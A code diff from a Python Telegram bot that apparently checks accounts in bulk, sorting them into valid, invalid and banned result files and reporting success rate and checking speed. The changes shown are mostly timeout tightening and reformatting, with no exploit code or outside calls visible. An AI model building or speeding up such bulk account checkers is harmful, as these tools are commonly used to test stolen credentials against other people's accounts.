             from concurrent.futures import as_completed
             completed = 0
             last_update_time = start_time
 
-            # Much shorter timeout for faster processing
-            timeout_per_account = 4 if len(accounts) <= 50 else 3
-            total_timeout = max(30, len(accounts) * timeout_per_account)
+            # Aggressive timeout for maximum speed
+            timeout_per_account = 1.5
+            total_timeout = max(15, len(accounts) * timeout_per_account)
 
             try:
                 for future in as_completed(all_futures, timeout=total_timeout):
                     try:
-                        future.result(timeout=2)  # Very short per-account timeout
+                        future.result(timeout=1.0)
                         completed += 1
 
-                        # Update every 10 accounts or every 5 seconds
+                        # Update every 10 accounts or every 2 seconds
                         current_time = time.time()
-                        if (completed % 10 == 0) or (current_time - last_update_time >= 5) or (completed == len(accounts)):
+                        if (completed % 10
+                                == 0) or (current_time - last_update_time
+                                          >= 2) or (completed
+                                                    == len(accounts)):
                             last_update_time = current_time
                             elapsed = current_time - start_time
 
@@ -2240,8 +2410,7 @@ class TelegramBot:
                                     chat_id=update.effective_chat.id,
                                     message_id=start_msg.message_id,
                                     text=progress_msg,
-                                    parse_mode='Markdown'
-                                )
+                                    parse_mode='Markdown')
                             except:
                                 pass
 
@@ -2251,11 +2420,9 @@ class TelegramBot:
                             processed += 1
 
             except Exception:
-                # Handle timeout - cancel remaining futures
                 remaining_futures = [f for f in all_futures if not f.done()]
                 for future in remaining_futures:
                     future.cancel()
-
                 with results_lock:
                     processed += len(remaining_futures)
 
@@ -2276,7 +2443,8 @@ class TelegramBot:
             invalid_content = "\n".join(invalid_accounts)
             invalid_file = io.BytesIO(invalid_content.encode('utf-8'))
             invalid_file.name = f"{user_prefix}_invalid.txt"
-            files_to_send.append(("Invalid", invalid_file, len(invalid_accounts)))
+            files_to_send.append(
+                ("Invalid", invalid_file, len(invalid_accounts)))
 
         if banned_accounts:
             banned_content = "\n".join(banned_accounts)
@@ -2285,21 +2453,20 @@ class TelegramBot:
             files_to_send.append(("Banned", banned_file, len(banned_accounts)))
 
         # Send completion summary
-        success_rate = (len(valid_accounts) / len(accounts)) * 100 if accounts else 0
+        success_rate = (len(valid_accounts) /
+                        len(accounts)) * 100 if accounts else 0
         speed = len(accounts) / processing_time if processing_time > 0 else 0
 
-        summary_msg = (
-            f"✅ **Ultra-Fast Processing Complete!**\n\n"
-            f"📊 **Results Summary:**\n"
-            f"🟢 Valid: {len(valid_accounts)}\n"
-            f"🔴 Invalid: {len(invalid_accounts)}\n"
-            f"🟡 Banned: {len(banned_accounts)}\n"
-            f"📈 Total: {len(accounts)}\n"
-            f"📊 Success Rate: {success_rate:.1f}%\n"
-            f"⚡ Processing Speed: {speed:.1f} accounts/sec\n"
-            f"⏱️ Total Time: {processing_time:.1f}s\n\n"
-            f"📁 Sending result files..."
-        )
+        summary_msg = (f"✅ **Ultra-Fast Processing Complete!**\n\n"
+                       f"📊 **Results Summary:**\n"
+                       f"🟢 Valid: {len(valid_accounts)}\n"
+                       f"🔴 Invalid: {len(invalid_accounts)}\n"
+                       f"🟡 Banned: {len(banned_accounts)}\n"
+                       f"📈 Total: {len(accounts)}\n"
+                       f"📊 Success Rate: {success_rate:.1f}%\n"
+                       f"⚡ Processing Speed: {speed:.1f} accounts/sec\n"
+                       f"⏱️ Total Time: {processing_time:.1f}s\n\n"
+                       f"📁 Sending result files...")
 
         await update.message.reply_text(summary_msg, parse_mode='Markdown')
 
@@ -2311,15 +2478,14 @@ class TelegramBot:
                     chat_id=update.effective_chat.id,
                     document=file_obj,
                     caption=f"📁 {file_type} accounts: {count} found",
-                    filename=file_obj.name
-                )
+                    filename=file_obj.name)
             except Exception as e:
                 logger.error(f"Error sending {file_type} file: {e}")
 
         if not files_to_send:
-            await update.message.reply_text("ℹ️ No results to send - all accounts failed processing.")
+            await update.message.reply_text(
+                "ℹ️ No results to send - all accounts failed processing.")
 
-    
 
 def main():
     """Main function to start the bot."""
@@ -2344,6 +2510,7 @@ def main():
         logger.info("Bot stopped by user")
     except Exception as e:
         logger.error(f"Error starting bot: {e}")
+
 
 if __name__ == "__main__":
     main()
